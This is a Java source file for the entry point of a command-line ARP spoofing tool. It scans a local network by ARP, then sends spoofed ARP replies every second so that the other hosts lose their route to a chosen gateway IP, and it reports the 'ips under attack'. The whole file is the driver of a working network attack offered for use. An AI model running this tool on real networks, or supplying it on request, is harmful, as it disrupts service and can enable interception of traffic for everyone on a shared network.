package proto;

import org.apache.commons.cli.*;
import org.pcap4j.core.PcapHandle;

import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.Pcaps;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;
import proto.listener.ReplyListener;
import proto.scanners.ArpScanNetwork;
import proto.sender.ArpSpoofSender;
import proto.sender.SpoofArpReply;


import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.*;
import java.util.concurrent.*;

public class Main implements Runnable {

    private PcapNetworkInterface networkInterface;
    private String network = ""; // network address of thee network eg. 192.168.0
    private PcapHandle sendHandle;
    private PcapHandle receiveHandle;
  /*  private MacAddress spoofMacAddress; // false macaddress used to scan the network and send false arp packets
    private InetAddress spoofInetAddress;*/
    private Map<InetAddress, MacAddress> ipMaps;
    private InetAddress addressToBlock; // ip address to block for others eg. gateway address
    private ArpScanNetwork arpScan; // scans the network using arp packets
    private ReplyListener listner; // listens for arp packets
    private Scanner scanner;
    private Set<InetAddress> ignoreIps; // ips to ignore in the attack
    private Options options;
    private CommandLine cmd;
    private InetAddress machineAddress;
    private ArpSpoofSender arpSpoofSender;
    private MacAddress machineMacAddress;
   // private SpoofArpReply spoofArpReply;


    public Main(String... args) throws ParseException {
        ignoreIps = new HashSet<>();
        ipMaps = new ConcurrentHashMap<>();
        scanner = new Scanner(System.in);
        options = new Options();
        addOptions();
        CommandLineParser parser = new DefaultParser();
        cmd = parser.parse(options, args);

    }


    @Override
    public void run() {
        try {


            if (cmd.hasOption("h")) {
                HelpFormatter formatter = new HelpFormatter();
                formatter.printHelp("ant", options);
                return;
            }


            if (cmd.hasOption("n")) {
                network = cmd.getOptionValue("n");
                if (network.length() < 1) throw new IllegalArgumentException("please provide with network");
            } else {
                throw new MissingArgumentException("please provide with network");
            }

            if (cmd.hasOption("mac")) {
                String mac = cmd.getOptionValue("mac");
                machineMacAddress = MacAddress.getByName(mac);
            } else {
                throw new MissingArgumentException("please provide with mac address");
            }

            if (cmd.hasOption("ip")) {
                String ip = cmd.getOptionValue("ip");
                addressToBlock = InetAddress.getByName(ip);
                ignoreIps.add(addressToBlock);
            } else {
                throw new MissingArgumentException("please provide ip to block for others");
            }

            if (cmd.hasOption("myip")) {
                String ip = cmd.getOptionValue("myip");
                machineAddress = InetAddress.getByName(ip);
                ignoreIps.add(machineAddress);
            } else {
                throw new MissingArgumentException("please provide ip to block for others");
            }

            if (cmd.hasOption("a")) {
                Arrays.stream(cmd.getOptionValue("a").split(","))
                        .map(String::trim)
                        .map(this::convertToIp)
                        .forEach(ignoreIps::add);
                System.out.println("length of ips to ignore  is  +++++" + ignoreIps.size());
            }

           /* if (cmd.hasOption("sip")) {
                spoofInetAddress = InetAddress.getByName(cmd.getOptionValue("sip").trim());
                ignoreIps.add(spoofInetAddress);
            } else {
                throw new MissingArgumentException("Please provide spoof ip address");
            }

            if (cmd.hasOption("smac")) {
                spoofMacAddress = MacAddress.getByName(cmd.getOptionValue("smac").trim());
            } else {
                throw new MissingArgumentException("Please provide spoof mac address");
            }*/

            //selecting network interface
            networkInterface = new NifSelector().selectNetworkInterface();

            if (networkInterface == null) {
                throw new MissingArgumentException("Please provide valid machine ip address");
            }

            System.out.println("Using the following network interface");
            System.out.println(networkInterface.getDescription());

            sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
            receiveHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);

            // working settings
            //spoofArpReply = new SpoofArpReply(sendHandle, spoofMacAddress, spoofInetAddress);
            arpScan = new ArpScanNetwork(sendHandle, network, machineAddress, machineMacAddress);
            listner = new ReplyListener(receiveHandle, ignoreIps, ipMaps);

            arpSpoofSender = new ArpSpoofSender(ipMaps, addressToBlock, machineMacAddress, sendHandle);

            ScheduledExecutorService scheduledExecutor = Executors.newScheduledThreadPool(2);
            scheduledExecutor.scheduleAtFixedRate(arpScan, 2L, 120L, TimeUnit.SECONDS);
            scheduledExecutor.scheduleAtFixedRate(arpSpoofSender, 2L, 1L, TimeUnit.SECONDS);

            ExecutorService executorService = Executors.newSingleThreadExecutor();
            executorService.execute(listner);
            System.out.println("running");
            while (true) {
                System.out.println("press 'p' to print ips under attack or 'q' to quit");
                String input = scanner.nextLine().trim();
                if (input.equals("p")) {
                    System.out.println("ips under attack");
                    ipMaps.entrySet()
                            .forEach(entry -> System.out.println(entry.getKey() + "  :  " + entry.getValue()));
                    System.out.println("-------------------------------------------");
                    System.out.println("ips not under attack");
                    ignoreIps.forEach(System.out::println);
                } else if (input.equals("q")) {

                    scheduledExecutor.shutdownNow();
                    System.out.println("attack down");
                    executorService.shutdownNow();
                    System.out.println("listeners down");
                    listner.close();
                    System.out.println("shutting down handles");
                    while (true) {
                        if (scheduledExecutor.isTerminated() && executorService.isTerminated()) {
                            sendHandle.close();
                            receiveHandle.close();
                            break;
                        }
                    }

                    System.out.println("interface handles down");
                    return;
                } else {
                    System.out.println("wrong input");
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }

    }

    private void addOptions() {
        options.addOption("ip", true, "Ip to block for others (gateway ip)");
        options.addOption("mac", true, "machine mac address (separator :)");
        options.addOption("n", true, "network  ie 192.168.1 or 110 or 160.5 ie the network classes");
        options.addOption("a", "ips to exclude exclude from the attack, separate by ','");
        options.addOption("h", "help me");
        options.addOption("myip", true, "Machine Ip address");
        /*options.addOption("smac", true, "spoof mac. Used to scan network and usd in attack");
        options.addOption("sip", true, "spoof ip. Used to scan the network");*/
    }


    private InetAddress convertToIp(String ip) {
        try {
            return InetAddress.getByName(ip);
        } catch (UnknownHostException e) {
            return machineAddress;
        }
    }


    //==================================================================================================================

    public static void main(String[] args) throws Exception {
        new Main(args).run();
        System.exit(0);
    }


}
